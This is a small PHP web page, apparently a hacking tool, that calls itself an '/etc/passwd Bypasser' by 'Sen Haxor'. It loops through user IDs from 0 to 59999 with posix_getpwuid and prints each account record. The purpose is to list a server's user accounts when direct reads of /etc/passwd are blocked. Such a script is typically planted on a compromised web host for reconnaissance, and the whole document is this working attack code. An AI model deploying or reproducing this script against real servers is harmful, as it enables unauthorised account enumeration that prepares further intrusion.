<title>Etc/Passwd Bypass Tool by Sen Haxor</title>
<body background="http://img54.xooimage.com/files/f/7/2/kbk29185-227a592.gif" bgcolor="black">
<form>
<p align="center" dir="rtl"><font color="#008080">
<font color="red" face="Tahoma"><h1>/etc/passwd Bypasser By Sen Haxor</h1></font></a></font><font color="red">
<font color="red"><span lang="ar-sa">
</form>
<form>
<td width="50%"><font color=red>users in server:<font color="black">&#222;&#199;&#198;&#227;&#229; &#199;&#225;&#237;&#230;&#210;&#209;&#199;&#202; &#200;&#199;&#225;&#211;&#237;&#209;&#221;&#209;</font></font></td>
<td width="50%"><select size=\"1\" name="plugin"><option value="plugin">/etc/passwd</option></option></select></td>
<td width="100%" colspan="2">
<p align="center"><input type="submit" value="Submit"></td>
</form>
<textarea method='POST'  rows=20 cols=100 wrap=off>


<?php
error_reporting(0);
 if ($_GET['plugin'] )

                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "</textarea>";

?>
